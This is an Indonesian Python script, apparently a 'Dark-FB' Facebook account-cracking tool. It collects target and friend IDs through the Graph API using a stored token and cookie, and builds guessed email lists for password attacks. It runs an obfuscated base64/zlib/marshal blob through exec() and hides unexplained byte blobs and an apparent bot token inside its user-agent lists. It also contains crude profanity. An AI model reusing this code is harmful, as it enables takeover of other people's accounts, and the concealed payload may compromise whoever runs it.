#UTF-PYTHON-3 BUAT OLEH RIKSY - 27 April 2022

import os,sys
try:
	import rich
except ImportError:
	os.system('pip install rich')
	try:
		import rich
	except ImportError:
		os.sys.exit("[?] Maaf Ngab, Sepertinya Tidak Bisa Install Rich(Install Manual : python -m pip install rich &> /dev/null)")
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as iprint
from rich.panel import Panel
from rich.tree import Tree
from rich import print as rprint
from rich.progress import track
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import Task
from rich.progress import DownloadColumn,SpinnerColumn,TransferSpeedColumn
from rich import filesize, get_console
console = Console()
from rich.console import Group
from rich.markdown import Markdown
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.box import DOUBLE, ROUNDED
from rich.padding import Padding
from rich.box import ROUNDED, Box
#from rich.box import loppp
#from rich.spinner import *
try:
	import os,sys
	try:
		import requests
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import bs4
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import stdiomask
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import mechanize
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import subprocess
		null = open(os.devnull, "w")
		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
		null.close()
		musik_="Kontol"
	except:musik_="Jangan"
except:pass
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import sys, os, subprocess, platform, struct
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json
import requests as req
import time,random,json
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from random import choice as pilih
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime
from urllib.parse import quote
from datetime import date
#from get_useragents import useragents
#ua_lo = useragents.UserAgents(limit=2000)

#user_agents = ua_lo.GetUserAgents()
#random_ua = ua_lo.RandomUserAgents()

# --[WARNA]--
H = "#000000" # Hitam
M = "#FF0000" # Merah
I = "#00FF00" # Hijau
K = "#FFFF00" # Kuning
B = "#00C8FF" # Biru
U = "#AF00FF" # Ungu
P = "#FF00FF" # Pink
C = "#00FFFF" # Biru Muda
Q = "#FFFFFF" # Putih
J = "#FF8F00" # Jingga
A = "#AAAAAA" # Abu-Ab
O = "#FFA500" # OREN

# --[WARNAV2]--
p = '\x1b[0;97m' # PUTIH
m = '\x1b[0;91m' # MERAH
i = '\x1b[1;92m' # HIJAU
k = '\x1b[1;93m' # KUNING
b = '\x1b[1;94m' # BIRU
u = '\x1b[1;95m' # UNGU
c = '\x1b[0;96m' # BIRU MUDA
q='\x1b[0m'	# WARNA MATI
h = "\x1b[0;90m"     # Hitam
j = "\x1b[38;5;208m" # Jingga
a = "\x1b[38;5;248m" # Abu-Abu
o='\033[38;2;255;127;0;1m' #ORANGE

# --[WARNA DALAM]--
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"

#WARNA rick(kotak)
HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN

# PENGATURAN WAKTU/JAMZ
ses = requests.Session()
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
jamz = datetime.now().strftime('%H:%M:%S')
jam_ = datetime.now().strftime('%H%M%S')
jam__ = str(datetime.now().strftime("%d%m%Y"))

# KUMPULAN USER AGNET
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjg","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua09= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0",b'rJLw2/F3v0PfZ+F88lY2OO393v/jb/tn/9E8UqHfu+y5+fXQtMyf623eEXAumpu77SWYBSAkbzDsNmOGxO4qRbL4bSRcNzAYvVmnUoEh9s1SzlaPvdVYJOarnmlFTEPf6FKmEZwkS4hkdrFrJL9yMk4kSf8SjmhF1uswHbWNjoCTvTbCRXnJiUJidV8K0aCguz14iRl9Xw9Q76KAGt6m4xH3sckRYqgcrIu5wOJIhbKd5LKwmEB4WSbyFjrpgirsOaVMR7cWgAUclQdxNWZL+VLAQpNt3V4OtBUTFa2bfxkz4EUw2k/FNp3wjXia+fANSlCB0joFGzZiX/w9kPEEKoUkDQneV1ngvvZCTbA3gxeroxHtKIku/F6walDbrB7RVPyu04SpZ2rqSJmw87EmfaR/DfDylxjbV7QyBO/eTuTVHwloayU0cnouKV9Qer3mlPbtAe/KoAUcG40b2afoMPZ5VJq+P0jlXC0o5r+QrPH1Wxjz3HXGw2TWH6CjqcCtgL56PfVPppkZaSoGuoIlFrIYGvvDLvthj75bV/0ry9BMn75T57j58MChDtc1H8Yw53+/x9wxg3r6/C94ZxROynyKj7Edi2cQgK5CG5eixFCaQjEEop9Apkqqa2EiBQhx5OcgGHWRAA0mSmjkdxJe',"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ugen2,ugen,ugen_,ugen__=[],[],[],[]
link_app,prox_k,id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man,fps = [],"",[100063690353340],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","","",""
#[100063690353340,110877271176800]
sistim=""
AnTi_rIkOd=""
def kotak(kata, wwe, wew):
	pertama = kata
	kedua   = mark(pertama, style=wwe)
	sol().print(kedua, style=wew)
def folder():
	try:os.mkdir("data")
	except:pass
	try:os.mkdir("results")
	except:pass
def play_mpv(x):
	if "Jangan" == musik_ or musik_ == "Jangan":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass

def cek_apk_hasil_crk():
	cekfile_crk("results")
	nama_z = input(">--Nama File--> ")
	if nama_z == "":kotak("# JANGAN KOSONG KONTOL",M,Q);time.sleep(2);exit()
	try:total__ = len(open(nama_z,"r").readlines())
	except FileNotFoundError:kotak('# FILE TIDAK ADA',K,Q);exit()
	with __Kiky__(max_workers=10) as (form):
		for data in open(nama_z,"r").readlines():
			try:
				data = data.replace("\n","")
				try:user, pw = data.split("|")
				except:user, pw, coki = data.split("|")
				form.submit(get_apk, user,pw,coki)
			except:pass
	exit()
class open_role:
	def __init__(self):
		global tiktok,pupuk,puput
		try:
			tiktok = open("data/login.txt","r").read()
		except:pass
		try:
			pupuk = open("data/cookie.txt","r").read()
			puput = {'cookie':pupuk}
		except:pass
class Main():
	def __init__(self):
		os.system("clear")
		open_role();self.intro()
	def menu_del(self, kataa):
		iprint(Panel(f"{MM}MOHON MAAF MENU {QQ}[{CC}{kataa}{QQ}]{MM} INI BELUM TERSEDIA... BACK TO MENU", style=Q));time.sleep(3)
		Main()
	def intro(self):
		_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==gkogSPAwoUMwTcIPhcIcsaTqpUfu5khV8uwmqtixPTWQrCEDVyZxCytmkYfbxVXEzbLKPm36Ljb9sRtYvYJ5ndrRhbmlUcmF3WUsnJf27hnCrQfO6oAOmgL+7tnCpQ7+JqI9FqCJLpV6lYuN2iUMnJMCpBGZgQbHQdLWSlhEZmZmblpUZMFGTlhgZKF2CipuZIFGSliAkaFTMAsDELDAkZLxJe')) # File Anti Rikod
		now = datetime.now()
		hour = now.hour
		if hour < 4:
			waktu = "Selamat Dini Hari"
		elif 4 <= hour < 12:
			waktu = "Selamat Pagi"
		elif 12 <= hour < 15:
			waktu = "Selamat Siang"
		elif 15 <= hour < 17:
			waktu = "Selamat Sore"
		else:
			waktu = "Selamat Malam"
		try:token = open("data/login.txt","r").read()
		except:login()
		try:cookie = open("data/cookie.txt","r").read()
		except:pass
		try:
			xnxzx = ""+cookie
			zza = f"{i}Token{q} And {k}Cookie{q}"
		except:
			zza = f"{i}Token{q}"
		try:sh = requests.get('https://httpbin.org/ip').json()
		except:sh = {'origin':'-'}
		tod = f"""		     ___                __            ____  __\n	  	    / _ \ ___ _  ____  / /__  ____   / __/ / /\n		   / // // _ `/ / __/ /  '_/ /____/ / _/  / _ \ \n		  /____/ \_,_/ /_/   /_/\_\        /_/   /_.__/"""
		my_ = Tree("                                 ",highlight=True, hide_root=True)
		my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")


		my_r = my__.add(f"{c}Mr.Risky{q}")
		my_rr= my_r.add(f"\r{k}My Github{q}")
		my_rr.add(f"{c}https://githuh.com/Dumai-991{q}")
		my_rr.add(f"{c}https://githuh.com/Dumai-200{q}")

		my_rrr=my_r.add(f"\r{i}My WhatsApp{q}")
		my_rrr.add(f"{b}6283893415477{q}")


		code="""Wans X Gans
	Jeck X Nano
	Xenzi Ganz
	Radhin Al Haady
	Zee K World
	Moch Aang Ardiansyah XD"""
		pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
		my_rrrr=my_r.add(f"\r{b}My Team{q}")
		my_rrrr.add(Group(pyhon))


		my_rrrrr=my_r.add(f"\r{c}Information{q}")
		tod=my_rrrrr.add(f"{j}Grub WhatsApp{q}")
		tod.add(f"{b}https://chat.whatsapp.com/GOzdlYW8my4LlEKkscnxl1{q}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(Halaman Facebook){q}")
		tod_.add(f"{b}https://www.facebook.com/101003905507650{q}")
		tod_.add(f"{b}https://www.facebook.com/110877271176800{q}")


		try:
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			idz = zxc["id"]
		except:
			try:os.remove('data/login.txt')
			except:pass
			try:os.remove('data/cookie.txt')
			except:pass
			token= Tree("                                 ",highlight=True, hide_root=True)
			token_e= token.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")
			prints(token_e)
			kotak("# TOKEN KADALUARSA", M, Q)
			os.sys.exit()
		data_=my_rrrrr.add(f"\r{k}Data-Data Facebook Anda{q}")
		data_.add(f"Username/Id       :{u}{nama}{q}")
		data_.add(f"Tanggal BerGabung :{u}{waktuu}{q}")
		data_.add(f"Ip Address        :{u}{str(sh['origin'])}{q}")
		data_.add(f"Login Menggunakan :{u}{zza}{q}")
		prints(my__)


		try:open("data/kata","r").read()
		except:open("data/kata","w").write("#SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)


		top = f"""01
02
03
04
05
06

00"""
		tip = f"""Crack Dari Public
Crack Dari Public{QQ}({KK}MASAL{QQ})
Crack Dari Follow
Crack Dari Random Email
Check Jumlah Teman
Check Hasil Crack
Check Options Akun Sesi

Log Out Dari Akun (Keluar)"""
		lpp = f"""{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN

{II}ONN"""
		tod = me()
		tod.add_column("NO", style=K, justify='center')
		tod.add_column("PILIHAN", style=Q, justify='center',width=60)
		tod.add_column("STATUS", style=M, justify='center')
		tod.add_row(top,tip, lpp)
		sol().print(tod, justify='center')
		self.pilihan()
	def pilihan(self):
		ki = input(f'>--Pilih 1-7--> ')
		if ki in ["1","01"]:self.public();os.sys.exit()
		elif ki in ["2","02"]:self.public_mass();os.sys.exit()
		elif ki in ["3","03"]:self.follow();os.sys.exit()
		elif ki in ["4","04"]:self.random_email();os.sys.exit()
		elif ki in ["5","05"]:self.cek_jumlah_teman();os.sys.exit()
		elif ki in ["6","06"]:self.rek();os.sys.exit()
		elif ki in ["7","07"]:self.cek_opsi();os.sys.exit()
		elif ki in ["00","00"]:self.logut()
		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{ki}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),Main()
	def logut(self):
		try:os.remove('data/login.txt')
		except:pass
		try:os.remove('data/cookie.txt')
		except:pass
		kotak("# Token Dan Cookies Berhasil DiHapus (Berhasil Log Out)", M, Q)
		os.sys.exit()

	def ambil_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
			time.sleep(3)
			Main()
		return nama
	def ubah_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
			time.sleep(3)
			Main()
		return nama
	def ubah_user(self,username):
		try:
			if username == "me":
				return(username)
			else:
				url    = 'https://mbasic.facebook.com/' + username
				with requests.Session() as xyz:
					req = par(xyz.get(url,cookies=puput).content,'html.parser')
					kut = req.find('a',string='Lainnya')
					id = str(kut['href']).split('=')[1]
					id = id.replace("&refid","")
					id=id.replace("&paipv", "")
					# id = re.search('owner_id=(.*?)"',str(kut)).group(1)
					return(id)
		except Exception as e:return(username)
	def ubah_user1(self,idd):
			try:
				if idd == "me":idd = "me"
				else:
					payload = {"fburl": "https://free.facebook.com/{}".format(idd), "check": "Lookup"}
					if "facebook" in idd:
						payload = {"fburl": idd, "check": "Lookup"}
					mmk = requests.post("https://lookup-id.com/", data=payload).content
					xxx = par(mmk, "html.parser")
					idtt = xxx.find("span", id="code")
					asw = idtt.text
					idd = asw
			except:idd = idd
			return idd
	def random_email(self):
		x = 0

		tod = me()
		tod.add_column("NO", style=K, justify='center')
		tod.add_column("PILIHAN", style=Q, justify='center',width=60)
		tod.add_row("1\n2\n3\n4","Username + @Gmail.com\nUsername + @Yahoo.com\nUsername + @Hotmail.com\nUsername + @Outlook.com")
		sol().print(tod, justify='center')

		ask = input(f">--Pilih 1-4--> ")
		if ask in["1"]:
			email = "@gmail.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		elif ask in["2"]:
			email = "@yahoo.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		elif ask in["3"]:
			email = "@hotmail.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		elif ask in["4"]:
			email = "@outlook.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		god=""
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()


	def public_mass(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# MASUKAN JUMLAH TARGER",K,Q)
		try:jmlh_ = int(input(">--Jumlah--> "))
		except:jmlh_ = 1
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		for x in range(jmlh_):
			idt = input(f">--{k}Target{q}--> : ")
			limit = ("10000")
			idt = self.ubah_user(idt)
			god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
			try:
				url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
				with requests.Session() as xyz:
					jso = json.loads(xyz.get(url,cookies=puput).text)
					for i in jso["friends"]["data"]:
						try:
							uid = i["id"]
							nama = i["name"]
							idd.append(uid+"<=>"+nama)
						except:pass
			except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
